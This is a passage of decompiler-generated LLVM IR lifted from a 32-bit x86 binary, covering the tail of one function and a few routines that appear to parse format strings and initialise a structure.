  %v0_804c90145 = phi i32 [ %v1_804c86a, %dec_label_pc_804c87f ], [ %v1_804c894, %dec_label_pc_804c885 ]
  %v1_804c897 = phi i32 [ 0, %dec_label_pc_804c87f ], [ %v1_804c897.pre, %dec_label_pc_804c885 ]
  %v0_804c897 = phi i32 [ 0, %dec_label_pc_804c87f ], [ %v4_804c88f, %dec_label_pc_804c885 ]
  %v2_804c897 = sub i32 %v0_804c897, %v1_804c897
  %v12_804c897 = icmp eq i32 %v2_804c897, 0
  %v13_804c897 = icmp slt i32 %v2_804c897, 0
  store i1 %v13_804c897, i1* %sf.global-to-local, align 1
  %v1_804c899 = icmp eq i1 %v12_804c897, false
  br i1 %v1_804c899, label %dec_label_pc_804c92f, label %dec_label_pc_804c901

dec_label_pc_804c8a1:                             ; preds = %dec_label_pc_804c875
  %v1_804c8a1 = add i32 %v0_804c86a, 348
  %v2_804c8a1 = inttoptr i32 %v1_804c8a1 to i32*
  store i32 0, i32* %v2_804c8a1, align 4
  %v0_804c8fd7 = load i32, i32* @esi, align 4
  %v1_804c8fd8 = icmp eq i32 %v0_804c8fd7, 0
  %v2_804c8fd9 = icmp slt i32 %v0_804c8fd7, 0
  store i1 %v2_804c8fd9, i1* %sf.global-to-local, align 1
  %v1_804c8ff15 = icmp eq i1 %v1_804c8fd8, false
  %v0_804c8ae.pre = load i32, i32* @esp, align 4
  br i1 %v1_804c8ff15, label %dec_label_pc_804c8ae, label %dec_label_pc_804c901

dec_label_pc_804c8ae:                             ; preds = %dec_label_pc_804c8a1, %dec_label_pc_804c8fb
  %v0_804c8b5 = phi i32 [ %v2_804c8fb, %dec_label_pc_804c8fb ], [ %v0_804c8fd7, %dec_label_pc_804c8a1 ]
  %v1_804c8c0 = phi i32 [ %v0_804c8ae40, %dec_label_pc_804c8fb ], [ %v0_804c8ae.pre, %dec_label_pc_804c8a1 ]
  %v1_804c8ae = add i32 %v1_804c8c0, 332
  store i32 %v1_804c8ae, i32* %edx.global-to-local, align 4
  %v1_804c8b5 = add i32 %v0_804c8b5, -128
  %v2_804c8b5 = icmp ult i32 %v0_804c8b5, 128
  %v6_804c8b5 = icmp eq i32 %v1_804c8b5, 0
  %v7_804c8b5 = icmp slt i32 %v1_804c8b5, 0
  store i1 %v7_804c8b5, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804c8c0 = add i32 %v1_804c8c0, -4
  %v3_804c8c0 = inttoptr i32 %v2_804c8c0 to i32*
  store i32 %v1_804c8ae, i32* %v3_804c8c0, align 4
  %v2_804c8c1 = or i1 %v2_804c8b5, %v6_804c8b5
  %v3_804c8c1 = load i32, i32* %eax.global-to-local, align 4
  %v4_804c8c1 = load i32, i32* @esi, align 4
  %v5_804c8c1 = select i1 %v2_804c8c1, i32 %v4_804c8c1, i32 %v3_804c8c1
  %v2_804c8c4 = add i32 %v1_804c8c0, -8
  %v3_804c8c4 = inttoptr i32 %v2_804c8c4 to i32*
  store i32 %v5_804c8c1, i32* %v3_804c8c4, align 4
  %v1_804c8c5 = add i32 %v1_804c8c0, 340
  store i32 %v1_804c8c5, i32* %eax.global-to-local, align 4
  %v2_804c8cc = add i32 %v1_804c8c0, -12
  %v3_804c8cc = inttoptr i32 %v2_804c8cc to i32*
  store i32 %v1_804c8c5, i32* %v3_804c8cc, align 4
  %v1_804c8cd = add i32 %v1_804c8c0, 204
  store i32 %v1_804c8cd, i32* @edi, align 4
  %v2_804c8d4 = add i32 %v1_804c8c0, -16
  %v3_804c8d4 = inttoptr i32 %v2_804c8d4 to i32*
  store i32 %v1_804c8cd, i32* %v3_804c8d4, align 4
  %v0_804c8d5 = call i32 @function_804feec()
  %v0_804c8da = load i32, i32* @esp, align 4
  %v1_804c8da = add i32 %v0_804c8da, 16
  store i32 %v0_804c8d5, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804c8e1 = icmp eq i32 %v0_804c8d5, 0
  %v2_804c8e1 = icmp slt i32 %v0_804c8d5, 0
  store i1 %v2_804c8e1, i1* %sf.global-to-local, align 1
  br i1 %v1_804c8e1, label %dec_label_pc_804c8f7, label %dec_label_pc_804c8e5

dec_label_pc_804c8e5:                             ; preds = %dec_label_pc_804c8ae
  %v0_804c8e5 = load i32, i32* @ebp, align 4
  %v2_804c8e5 = add i32 %v0_804c8da, 12
  %v3_804c8e5 = inttoptr i32 %v2_804c8e5 to i32*
  store i32 %v0_804c8e5, i32* %v3_804c8e5, align 4
  %v1_804c8e6 = add i32 %v0_804c8da, 384
  %v2_804c8e6 = inttoptr i32 %v1_804c8e6 to i32*
  %v3_804c8e6 = load i32, i32* %v2_804c8e6, align 4
  %v5_804c8e6 = add i32 %v0_804c8da, 8
  %v6_804c8e6 = inttoptr i32 %v5_804c8e6 to i32*
  store i32 %v3_804c8e6, i32* %v6_804c8e6, align 4
  %v2_804c8ed = add i32 %v0_804c8da, 4
  %v3_804c8ed = inttoptr i32 %v2_804c8ed to i32*
  store i32 %v0_804c8d5, i32* %v3_804c8ed, align 4
  %v0_804c8ee = load i32, i32* @edi, align 4
  %v3_804c8ee = inttoptr i32 %v0_804c8da to i32*
  store i32 %v0_804c8ee, i32* %v3_804c8ee, align 4
  %v0_804c8ef = load i32, i32* %stack_var_-364, align 4
  %v4_804c8ef = call i32 @function_8050048(i32 %v0_804c8ef, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c8ef, i32* %eax.global-to-local, align 4
  %v0_804c8f4 = load i32, i32* @esp, align 4
  %v1_804c8f4 = add i32 %v0_804c8f4, 16
  %v7_804c8f4 = icmp slt i32 %v1_804c8f4, 0
  store i1 %v7_804c8f4, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804c8f7

dec_label_pc_804c8f7:                             ; preds = %dec_label_pc_804c8ae, %dec_label_pc_804c8e5
  %v1_804c8fb = phi i32 [ 0, %dec_label_pc_804c8ae ], [ %v4_804c8ef, %dec_label_pc_804c8e5 ]
  %v0_804c8ae40 = phi i32 [ %v1_804c8da, %dec_label_pc_804c8ae ], [ %v1_804c8f4, %dec_label_pc_804c8e5 ]
  %v2_804c8f7 = sub i32 %v1_804c8fb, %v0_804c8d5
  %v12_804c8f7 = icmp eq i32 %v2_804c8f7, 0
  %v13_804c8f7 = icmp slt i32 %v2_804c8f7, 0
  store i1 %v13_804c8f7, i1* %sf.global-to-local, align 1
  %v1_804c8f9 = icmp eq i1 %v12_804c8f7, false
  br i1 %v1_804c8f9, label %dec_label_pc_804c92f, label %dec_label_pc_804c8fb

dec_label_pc_804c8fb:                             ; preds = %dec_label_pc_804c8f7
  %v0_804c8fb = load i32, i32* @esi, align 4
  %v2_804c8fb = sub i32 %v0_804c8fb, %v1_804c8fb
  %v12_804c8fb = icmp eq i32 %v2_804c8fb, 0
  %v13_804c8fb = icmp slt i32 %v2_804c8fb, 0
  store i32 %v2_804c8fb, i32* @esi, align 4
  store i1 %v13_804c8fb, i1* %sf.global-to-local, align 1
  %v1_804c8ff = icmp eq i1 %v12_804c8fb, false
  br i1 %v1_804c8ff, label %dec_label_pc_804c8ae, label %dec_label_pc_804c901

dec_label_pc_804c901:                             ; preds = %dec_label_pc_804c8fb, %dec_label_pc_804c8a1, %dec_label_pc_804c897
  %v0_804c901 = phi i32 [ %v0_804c90145, %dec_label_pc_804c897 ], [ %v0_804c8ae.pre, %dec_label_pc_804c8a1 ], [ %v0_804c8ae40, %dec_label_pc_804c8fb ]
  %v1_804c901 = add i32 %v0_804c901, 8
  %v2_804c901 = inttoptr i32 %v1_804c901 to i32*
  %v3_804c901 = load i32, i32* %v2_804c901, align 4
  store i32 %v3_804c901, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804c90a = add i32 %v0_804c901, 368
  %v2_804c90a = inttoptr i32 %v1_804c90a to i32*
  %v3_804c90a = load i32, i32* %v2_804c90a, align 4
  store i32 %v3_804c90a, i32* @eax, align 4
  %v0_804c911 = call i32 @function_804c2ec()
  store i32 %v0_804c911, i32* %eax.global-to-local, align 4
  %v1_804c916 = load i32, i32* @esp, align 4
  %v2_804c916 = add i32 %v1_804c916, 8
  %v3_804c916 = inttoptr i32 %v2_804c916 to i32*
  %v4_804c916 = load i32, i32* %v3_804c916, align 4
  %v5_804c916 = sub i32 %v0_804c911, %v4_804c916
  %v15_804c916 = icmp eq i32 %v5_804c916, 0
  %v16_804c916 = icmp slt i32 %v5_804c916, 0
  store i1 %v16_804c916, i1* %sf.global-to-local, align 1
  %v1_804c91a = icmp eq i1 %v15_804c916, false
  br i1 %v1_804c91a, label %dec_label_pc_804c92f, label %dec_label_pc_804c91c

dec_label_pc_804c91c:                             ; preds = %dec_label_pc_804c901, %dec_label_pc_804c689, %dec_label_pc_804c4b4
  %v0_804c91c = phi i32 [ %v1_804c916, %dec_label_pc_804c901 ], [ %v0_804c91c.pre, %dec_label_pc_804c689 ], [ %v1_804c4d2, %dec_label_pc_804c4b4 ]
  %v1_804c91c = add i32 %v0_804c91c, 16
  %v2_804c91c = inttoptr i32 %v1_804c91c to i32*
  %v3_804c91c = load i32, i32* %v2_804c91c, align 4
  store i32 %v3_804c91c, i32* @ebx, align 4
  store i32 %v3_804c91c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c40c.backedge

dec_label_pc_804c927:                             ; preds = %dec_label_pc_804c44a
  %v1_804c927 = add i32 %v0_804c927, 2
  %v10_804c927 = icmp slt i32 %v1_804c927, 0
  store i1 %v10_804c927, i1* %sf.global-to-local, align 1
  store i32 %v1_804c927, i32* @ebx, align 4
  br label %dec_label_pc_804c40c.backedge

dec_label_pc_804c92f:                             ; preds = %dec_label_pc_804c436, %dec_label_pc_804c901, %dec_label_pc_804c897, %dec_label_pc_804c842, %dec_label_pc_804c81b, %dec_label_pc_804c78b, %dec_label_pc_804c660, %dec_label_pc_804c6fe, %dec_label_pc_804c6bf, %dec_label_pc_804c8f7
  %v0_804c92f = phi i32 [ %v0_804c8ae40, %dec_label_pc_804c8f7 ], [ %v0_804c92f.pre.pre, %dec_label_pc_804c436 ], [ %v1_804c916, %dec_label_pc_804c901 ], [ %v0_804c90145, %dec_label_pc_804c897 ], [ %v1_804c86a, %dec_label_pc_804c842 ], [ %v1_804c830, %dec_label_pc_804c81b ], [ %v0_804c4ac.lcssa, %dec_label_pc_804c78b ], [ %v1_804c67e, %dec_label_pc_804c660 ], [ %v1_804c716, %dec_label_pc_804c6fe ], [ %v1_804c6e2, %dec_label_pc_804c6bf ]
  %v1_804c92f = inttoptr i32 %v0_804c92f to i32*
  store i32 -1, i32* %v1_804c92f, align 4
  br label %dec_label_pc_804c936

dec_label_pc_804c936:                             ; preds = %dec_label_pc_804c441, %dec_label_pc_804c3af, %dec_label_pc_804c3ce, %dec_label_pc_804c92f
  %v0_804c936 = load i32, i32* @esp, align 4
  %v1_804c936 = inttoptr i32 %v0_804c936 to i32*
  %v2_804c936 = load i32, i32* %v1_804c936, align 4
  store i32 %v2_804c936, i32* %eax.global-to-local, align 4
  %v1_804c939 = add i32 %v0_804c936, 348
  %v10_804c939 = icmp slt i32 %v1_804c939, 0
  store i1 %v10_804c939, i1* %sf.global-to-local, align 1
  ret i32 %v2_804c936

; uselistorder directives
  uselistorder i32 %v1_804c927, { 1, 2, 0 }
  uselistorder i32 %v3_804c91c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804c901, { 1, 0 }
  uselistorder i32 %v2_804c8fb, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804c8da, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804c8d5, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804c8b5, { 1, 0 }
  uselistorder i32 %v0_804c8ae.pre, { 1, 0 }
  uselistorder i32 %v0_804c881, { 1, 0 }
  uselistorder i32 %v3_804c875, { 1, 0 }
  uselistorder i32 %v0_804c86a, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804c842, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c81b, { 0, 2, 1, 3 }
  uselistorder i8 %v4_804c803, { 1, 0 }
  uselistorder i32 %v2_804c7ef, { 1, 0, 2, 3 }
  uselistorder i32 %v6_804c7dc, { 1, 0 }
  uselistorder i32 %v1_804c7d9, { 1, 0 }
  uselistorder i32 %v1_804c7cf, { 1, 0 }
  uselistorder i32 %v0_804c7cf, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c7ae, { 1, 0 }
  uselistorder i32 %v1_804c78b, { 1, 0 }
  uselistorder i32 %v1_804c749, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804c765, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804c72e, { 1, 0 }
  uselistorder i32 %v1_804c719, { 1, 0 }
  uselistorder i32 %v1_804c6e5, { 1, 0 }
  uselistorder i32 %v0_804c6bf, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_804c6a5, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_804c691, { 1, 0 }
  uselistorder i32 %v1_804c647, { 1, 0 }
  uselistorder i32 %v4_804c615, { 1, 0 }
  uselistorder i32 %v0_804c60a, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804c605, { 1, 0 }
  uselistorder i32 %v0_804c63e, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804c5f5, { 1, 0 }
  uselistorder i32 %v1_804c5ec, { 1, 0 }
  uselistorder i32 %v1_804c5e0, { 1, 0 }
  uselistorder i32 %v3_804c5d4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804c5ca, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804c5c5, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804c5c3, { 1, 0 }
  uselistorder i32 %v0_804c615, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804c605, { 1, 2, 0 }
  uselistorder i32 %v3_804c59d, { 0, 1, 3, 2 }
  uselistorder i8 %v4_804c58b, { 1, 0 }
  uselistorder i32 %v4_804c582, { 1, 0 }
  uselistorder i32 %v3_804c582, { 1, 0 }
  uselistorder i32 %v6_804c57a, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_804c54b, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_804c54a, { 2, 1, 0 }
  uselistorder i32 %v1_804c523, { 1, 0 }
  uselistorder i32 %v1_804c517, { 1, 0 }
  uselistorder i32 %v1_804c512, { 1, 0 }
  uselistorder i32 %v2_804c50a, { 1, 0 }
  uselistorder i32 %tmp66, { 1, 0 }
  uselistorder i32 %v3_804c4f4, { 1, 0, 2 }
  uselistorder i8 %v3_804c4e3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804c4da, { 1, 0 }
  uselistorder i32 %v3_804c4ac, { 14, 9, 12, 10, 11, 15, 16, 8, 7, 4, 5, 13, 2, 3, 6, 0, 1, 17, 18, 19 }
  uselistorder i32 %v0_804c4ac.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804c4a8, { 1, 0 }
  uselistorder i32 %v1_804c4a8.pre, { 1, 0 }
  uselistorder i32 %v1_804c4a7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804c4a4, { 1, 0 }
  uselistorder i32 %v2_804c4a870, { 1, 0 }
  uselistorder i32 %v3_804c48e, { 1, 0 }
  uselistorder i8 %v4_804c44a, { 1, 0 }
  uselistorder i32 %v1_804c44a, { 1, 0, 3, 2 }
  uselistorder i8 %v2_804c441, { 1, 0 }
  uselistorder i32 %v2_804c416, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_804c412, { 1, 0 }
  uselistorder i8 %v2_804c40c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c41a, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804c3fc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 4, 5, 0, 6, 1, 7, 8, 9, 10 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 62, 63, 64, 65, 66, 67, 68, 69, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 54, 55, 94, 56, 57, 58, 59, 60, 61 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 20, 8, 9, 3, 10, 11, 4, 5, 6, 13, 12, 14, 15, 21, 16, 17, 18, 22, 19, 23, 25, 24, 7 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 42, 43, 44, 45, 46, 47, 48, 49, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 50, 51, 52, 53, 54, 55, 56, 57, 2, 1, 0, 58, 59, 60, 61, 63, 37, 62, 38, 39, 40, 41 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @function_804c2ec, { 2, 1, 0, 3 }
  uselistorder i32 ()* @function_804feec, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804c936, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804c92f, { 1, 9, 2, 3, 4, 5, 7, 8, 6, 0 }
  uselistorder label %dec_label_pc_804c8f7, { 1, 0 }
  uselistorder label %dec_label_pc_804c8ae, { 1, 0 }
  uselistorder label %dec_label_pc_804c897, { 1, 0 }
  uselistorder label %dec_label_pc_804c842, { 1, 0 }
  uselistorder label %dec_label_pc_804c814, { 1, 0 }
  uselistorder label %dec_label_pc_804c7f9, { 1, 0 }
  uselistorder label %dec_label_pc_804c7e3, { 1, 0 }
  uselistorder label %dec_label_pc_804c7cf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c7ca, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c75c, { 1, 0 }
  uselistorder label %dec_label_pc_804c742, { 1, 0 }
  uselistorder label %dec_label_pc_804c660, { 1, 0 }
  uselistorder label %dec_label_pc_804c605, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804c5b3, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804c563, { 1, 0 }
  uselistorder label %dec_label_pc_804c54a, { 1, 0 }
  uselistorder label %dec_label_pc_804c536, { 1, 0 }
  uselistorder label %dec_label_pc_804c531, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c512, { 1, 0 }
  uselistorder label %dec_label_pc_804c49d, { 1, 0 }
  uselistorder label %dec_label_pc_804c495, { 1, 0 }
  uselistorder label %dec_label_pc_804c441, { 1, 0 }
  uselistorder label %dec_label_pc_804c436, { 1, 0 }
  uselistorder label %dec_label_pc_804c40c.backedge, { 2, 1, 0 }
}

define i32 @function_804c944(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804c944:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c944 = load i32, i32* @esi, align 4
  %v0_804c945 = load i32, i32* @ebx, align 4
  store i32 %v0_804c945, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804c959 = bitcast i32* %arg1 to i8*
  %v4_804c959 = call i32 @function_804d4e0(i8* %v3_804c959, i32 0, i32 188)
  %v0_804c95e = load i32, i32* @ebx, align 4
  %v1_804c95e = add i32 %v0_804c95e, 40
  store i32 %v1_804c95e, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_804c966 = add i32 %v0_804c95e, 24
  %v2_804c966 = inttoptr i32 %v1_804c966 to i32*
  %v3_804c966 = load i32, i32* %v2_804c966, align 4
  %v4_804c966 = add i32 %v3_804c966, -1
  store i32 %v4_804c966, i32* %v2_804c966, align 4
  %v0_804c96c = load i32, i32* @esi, align 4
  %v1_804c96c = load i32, i32* @ebx, align 4
  %v2_804c96c = inttoptr i32 %v1_804c96c to i32*
  store i32 %v0_804c96c, i32* %v2_804c96c, align 4
  %v0_804c96e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c96e

dec_label_pc_804c96e:                             ; preds = %dec_label_pc_804c96e, %dec_label_pc_804c944
  %v0_804c96e = phi i32 [ %v1_804c974, %dec_label_pc_804c96e ], [ %v0_804c96e.pre, %dec_label_pc_804c944 ]
  %v1_804c96e = inttoptr i32 %v0_804c96e to i32*
  store i32 8, i32* %v1_804c96e, align 4
  %v0_804c974 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c974 = add i32 %v0_804c974, 4
  store i32 %v1_804c974, i32* %eax.global-to-local, align 4
  %v0_804c977 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c977 = add i32 %v0_804c977, -1
  %v8_804c977 = icmp eq i32 %v1_804c977, 0
  store i32 %v1_804c977, i32* %edx.global-to-local, align 4
  %v1_804c978 = icmp eq i1 %v8_804c977, false
  br i1 %v1_804c978, label %dec_label_pc_804c96e, label %dec_label_pc_804c97a

dec_label_pc_804c97a:                             ; preds = %dec_label_pc_804c96e
  %v0_804c97a = load i32, i32* @esi, align 4
  store i32 %v0_804c97a, i32* %eax.global-to-local, align 4
  %v1_804c9a520 = inttoptr i32 %v0_804c97a to i8*
  %v2_804c9a521 = load i8, i8* %v1_804c9a520, align 1
  %v3_804c9a522 = zext i8 %v2_804c9a521 to i32
  %v5_804c9a523 = and i32 %v1_804c977, -256
  %v6_804c9a524 = or i32 %v3_804c9a522, %v5_804c9a523
  store i32 %v6_804c9a524, i32* %edx.global-to-local, align 4
  %v4_804c9a725 = icmp eq i8 %v2_804c9a521, 0
  %v1_804c9a927 = icmp eq i1 %v4_804c9a725, false
  br i1 %v1_804c9a927, label %dec_label_pc_804c983, label %dec_label_pc_804c9ab

dec_label_pc_804c983:                             ; preds = %dec_label_pc_804c97a, %dec_label_pc_804c9a5.backedge
  %v6_804c9a530 = phi i32 [ %v6_804c9a5, %dec_label_pc_804c9a5.backedge ], [ %v6_804c9a524, %dec_label_pc_804c97a ]
  %v2_804c9a529 = phi i8 [ %v2_804c9a5, %dec_label_pc_804c9a5.backedge ], [ %v2_804c9a521, %dec_label_pc_804c97a ]
  %v0_804c98828 = phi i32 [ %v0_804c988.be, %dec_label_pc_804c9a5.backedge ], [ %v0_804c97a, %dec_label_pc_804c97a ]
  %v10_804c983 = icmp eq i8 %v2_804c9a529, 37
  %v1_804c986 = icmp eq i1 %v10_804c983, false
  br i1 %v1_804c986, label %dec_label_pc_804c9a4, label %dec_label_pc_804c988

dec_label_pc_804c988:                             ; preds = %dec_label_pc_804c983
  %v1_804c988 = add i32 %v0_804c98828, 1
  store i32 %v1_804c988, i32* %eax.global-to-local, align 4
  %v1_804c989 = inttoptr i32 %v1_804c988 to i8*
  %v2_804c989 = load i8, i8* %v1_804c989, align 1
  %v11_804c989 = icmp eq i8 %v2_804c989, 37
  br i1 %v11_804c989, label %dec_label_pc_804c9a4, label %dec_label_pc_804c98e

dec_label_pc_804c98e:                             ; preds = %dec_label_pc_804c988
  %v1_804c991 = load i32, i32* @ebx, align 4
  %v2_804c991 = inttoptr i32 %v1_804c991 to i32*
  store i32 %v1_804c988, i32* %v2_804c991, align 4
  %v0_804c993 = load i32, i32* @ebx, align 4
  %v1_804c994 = inttoptr i32 %v0_804c993 to i32*
  %v2_804c994 = call i32 @function_804cb35(i32* %v1_804c994)
  store i32 %v2_804c994, i32* %eax.global-to-local, align 4
  %v2_804c99c = icmp slt i32 %v2_804c994, 0
  br i1 %v2_804c99c, label %dec_label_pc_804c9af, label %dec_label_pc_804c9a0

dec_label_pc_804c9a0:                             ; preds = %dec_label_pc_804c98e
  %v0_804c9a0 = load i32, i32* @ebx, align 4
  %v1_804c9a0 = inttoptr i32 %v0_804c9a0 to i32*
  %v2_804c9a0 = load i32, i32* %v1_804c9a0, align 4
  %v4_804c9a5.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c9a5.backedge

dec_label_pc_804c9a4:                             ; preds = %dec_label_pc_804c988, %dec_label_pc_804c983
  %v0_804c9a4 = phi i32 [ %v1_804c988, %dec_label_pc_804c988 ], [ %v0_804c98828, %dec_label_pc_804c983 ]
  %v1_804c9a4 = add i32 %v0_804c9a4, 1
  br label %dec_label_pc_804c9a5.backedge

dec_label_pc_804c9a5.backedge:                    ; preds = %dec_label_pc_804c9a4, %dec_label_pc_804c9a0
  %v4_804c9a5.be = phi i32 [ %v4_804c9a5.pre.pre, %dec_label_pc_804c9a0 ], [ %v6_804c9a530, %dec_label_pc_804c9a4 ]
  %v0_804c988.be = phi i32 [ %v2_804c9a0, %dec_label_pc_804c9a0 ], [ %v1_804c9a4, %dec_label_pc_804c9a4 ]
  store i32 %v0_804c988.be, i32* %eax.global-to-local, align 4
  %v1_804c9a5 = inttoptr i32 %v0_804c988.be to i8*
  %v2_804c9a5 = load i8, i8* %v1_804c9a5, align 1
  %v3_804c9a5 = zext i8 %v2_804c9a5 to i32
  %v5_804c9a5 = and i32 %v4_804c9a5.be, -256
  %v6_804c9a5 = or i32 %v3_804c9a5, %v5_804c9a5
  store i32 %v6_804c9a5, i32* %edx.global-to-local, align 4
  %v4_804c9a7 = icmp eq i8 %v2_804c9a5, 0
  %v1_804c9a9 = icmp eq i1 %v4_804c9a7, false
  br i1 %v1_804c9a9, label %dec_label_pc_804c983, label %dec_label_pc_804c9a5.dec_label_pc_804c9ab_crit_edge

dec_label_pc_804c9a5.dec_label_pc_804c9ab_crit_edge: ; preds = %dec_label_pc_804c9a5.backedge
  %v0_804c9ab.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c9ab

dec_label_pc_804c9ab:                             ; preds = %dec_label_pc_804c9a5.dec_label_pc_804c9ab_crit_edge, %dec_label_pc_804c97a
  %v0_804c9ab = phi i32 [ %v0_804c9ab.pre, %dec_label_pc_804c9a5.dec_label_pc_804c9ab_crit_edge ], [ %v0_804c97a, %dec_label_pc_804c97a ]
  %v1_804c9ab = load i32, i32* @ebx, align 4
  %v2_804c9ab = inttoptr i32 %v1_804c9ab to i32*
  store i32 %v0_804c9ab, i32* %v2_804c9ab, align 4
  br label %dec_label_pc_804c9af

dec_label_pc_804c9af:                             ; preds = %dec_label_pc_804c98e, %dec_label_pc_804c9ab
  %storemerge = phi i32 [ 0, %dec_label_pc_804c9ab ], [ -1, %dec_label_pc_804c98e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804c9af = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c9af, i32* @edx, align 4
  %v2_804c9b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c9b0, i32* @ebx, align 4
  store i32 %v0_804c944, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804c9a5, { 1, 0 }
  uselistorder i8 %v2_804c9a5, { 1, 2, 0 }
  uselistorder i32 %v0_804c988.be, { 2, 1, 0 }
  uselistorder i32 %v0_804c98828, { 1, 0 }
  uselistorder i32 %v0_804c97a, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804c977, { 0, 2, 1 }
  uselistorder i32 %v1_804c974, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 7, 6, 8 }
  uselistorder label %dec_label_pc_804c9af, { 1, 0 }
  uselistorder label %dec_label_pc_804c983, { 1, 0 }
}

define i32 @function_804c9b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804c9b4:
  %stack_var_-12 = alloca i32, align 4
  %v0_804c9b4 = load i32, i32* @esi, align 4
  %v0_804c9b5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804c9c1 = add i32 %arg1, 24
  %v2_804c9c1 = inttoptr i32 %v1_804c9c1 to i32*
  %v3_804c9c1 = load i32, i32* %v2_804c9c1, align 4
  %v2_804c9c4 = add i32 %arg1, 76
  %v3_804c9c4 = inttoptr i32 %v2_804c9c4 to i32*
  store i32 %arg2, i32* %v3_804c9c4, align 4
  %tmp8 = icmp slt i32 %v3_804c9c1, 1
  br i1 %tmp8, label %dec_label_pc_804c9f2, label %dec_label_pc_804c9cb

dec_label_pc_804c9cb:                             ; preds = %dec_label_pc_804c9b4
  %v1_804c9ce = load i32, i32* @ebx, align 4
  %v2_804c9ce = add i32 %v1_804c9ce, 28
  %v3_804c9ce = inttoptr i32 %v2_804c9ce to i32*
  store i32 %v3_804c9c1, i32* %v3_804c9ce, align 4
